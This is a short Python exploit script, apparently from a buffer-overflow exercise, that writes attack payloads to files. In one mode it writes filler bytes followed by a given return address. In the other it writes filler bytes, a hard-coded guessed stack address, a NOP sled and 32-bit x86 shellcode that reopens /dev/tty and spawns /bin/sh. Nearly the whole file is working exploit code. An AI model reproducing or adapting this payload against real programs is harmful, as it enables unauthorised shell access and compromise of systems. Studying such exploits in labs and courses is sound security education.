import sys
import struct

# Check if the correct number of arguments is provided
if len(sys.argv) != 2:
    print("Usage: python3 attack.py <target_address> or shellcode")
    sys.exit(1)

# Check if the argument is "shellcode"
if(sys.argv[1] == "shellcode"):
    # Pack the guess address in little-endian format
    guess_address = struct.pack('<I', 0xffffd894)

    # Create the NOP sled with 20 NOP instructions
    nop_sled = b'\x90' * 20

    # Define the shellcode
    shell_code = b'\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'

    # Combine everything into the attack payload
    shell_string = b'A' * 16 + guess_address + nop_sled + shell_code

    # Write the attack string to the "attack_string" file
    with open('shell_string', 'wb') as file:
        file.write(shell_string)

    print(f'Shell string generated and stored in "shell_string" file')

else:
    # Extract the target address from the command line argument
    target_address = struct.pack('<I', int(sys.argv[1], 16))

    # Craft the attack string to trigger buffer overflow and overwrite return address
    # 'A' * 16 to fill the buffer and then append the target function address
    attack_string = b'A' * 16 + target_address

    # Write the attack string to the "attack_string" file
    with open('attack_string', 'wb') as file:
        file.write(attack_string)

    print(f'Attack string generated and stored in "attack_string" file with target address {sys.argv[1]}')




